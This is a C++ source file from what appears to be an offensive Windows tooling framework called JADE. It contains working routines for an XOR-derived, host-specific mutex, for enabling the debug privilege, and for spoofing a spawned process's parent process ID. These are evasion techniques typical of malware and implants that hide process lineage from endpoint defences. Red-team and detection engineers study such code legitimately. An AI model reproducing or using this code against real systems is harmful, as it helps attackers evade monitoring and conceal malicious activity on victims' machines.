#include "JADE.h"

// JADE.cpp : This file contains the custom functions used throughout Windows JADE framework
//
#ifndef _WIN32_WINNT            // Specifies that the minimum required platform is Windows Vista.
#define _WIN32_WINNT 0x0600     // Change this to the appropriate value to target other versions of Windows.
#endif
#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif

#include <Windows.h>
#include <stdlib.h>
#include <stdio.h>
#include <winsock.h>
#include <TlHelp32.h>
#include <tchar.h>
#include <iostream>

#pragma comment(lib,"ws2_32")

// ******************************** XOR MUTEX FUNCTION ******************************

HANDLE 
XOR_Mutex(char xorkey[5])
{
	char hostname[128] = "";
	char mutexname[128] = { '\0' };
	int keysz = strlen(xorkey);
	WSADATA wsadata;
	
	WSAStartup(MAKEWORD(2, 2), &wsadata);

	if (gethostname(hostname, sizeof(hostname)) != 0)
		return NULL;

	for (int i = 0; i < strlen(hostname); i++)
		mutexname[i] = ((hostname[i] - '0') ^ (xorkey[i % keysz] - '0')) + '0';

	return CreateMutexA(NULL, FALSE, mutexname);

}

// ******************************* PARENT SPOOF FUNCTIONS ******************************

// update current process' token to hold the debug privileges in order to set the
// parent process id of the to-be-spawned process
bool
AdjustToken(void)
{
	HANDLE hToken;
	TOKEN_PRIVILEGES sTP;

	if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
	{
		if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &sTP.Privileges[0].Luid))
		{
			CloseHandle(hToken);
			return FALSE;
		}
		sTP.PrivilegeCount = 1;
		sTP.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
		if (!AdjustTokenPrivileges(hToken, 0, &sTP, sizeof(sTP), NULL, NULL))
		{
			CloseHandle(hToken);
			return FALSE;
		}
		CloseHandle(hToken);
		return TRUE;
	}
	return FALSE;
}

// Run through all processes in the process list to get the PID by process name
DWORD
GetParentPID(const char *proc_name)
{
	PROCESSENTRY32 entry;
	entry.dwSize = sizeof(PROCESSENTRY32);

	HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

	if (Process32First(snap, &entry) == TRUE)
	{
		do {
			if (strncmp(proc_name, (char*)entry.szExeFile, strlen(proc_name)) == 0)
				return entry.th32ProcessID;
		} while (Process32Next(snap, &entry) == TRUE);
	}

	return 0;
}

// main function to handle spoofing a parent process id for a given process
int
SpoofParent(wchar_t* commandline, const char* parent_req)
{
	STARTUPINFOEXW sie = { sizeof(sie) };
	STARTUPINFOW sui;
	PROCESS_INFORMATION pi;
	SIZE_T cbAttributeListSize = 0;
	PPROC_THREAD_ATTRIBUTE_LIST pAttributeList = NULL;
	HANDLE hParentProcess = NULL;
	DWORD dwPid = GetParentPID(parent_req);

	if (dwPid == 0)
		return -1;

	InitializeProcThreadAttributeList(NULL, 1, 0, &cbAttributeListSize);
	pAttributeList = (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, cbAttributeListSize);
	if (pAttributeList == NULL)
		return -1;
	
	if (!InitializeProcThreadAttributeList(pAttributeList, 1, 0, &cbAttributeListSize))
		return -1;

	if (!AdjustToken())
		return -1;
	
	hParentProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid);
	if (hParentProcess == NULL)
		return -1;

	if (!UpdateProcThreadAttribute(pAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParentProcess, sizeof(HANDLE), NULL, NULL))
		return -1;
	
	memset(&sui, 0, sizeof(sui));
	sui.cb = sizeof(STARTUPINFOEX);
	sui.dwFlags = STARTF_USESHOWWINDOW;
	sie.StartupInfo = sui;
	sie.lpAttributeList = pAttributeList;

	if (!CreateProcessW(NULL, commandline, NULL, NULL, TRUE, EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &sie.StartupInfo, &pi))
		return -1;

	DeleteProcThreadAttributeList(pAttributeList);
	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);
	CloseHandle(hParentProcess);

	return 0;
}
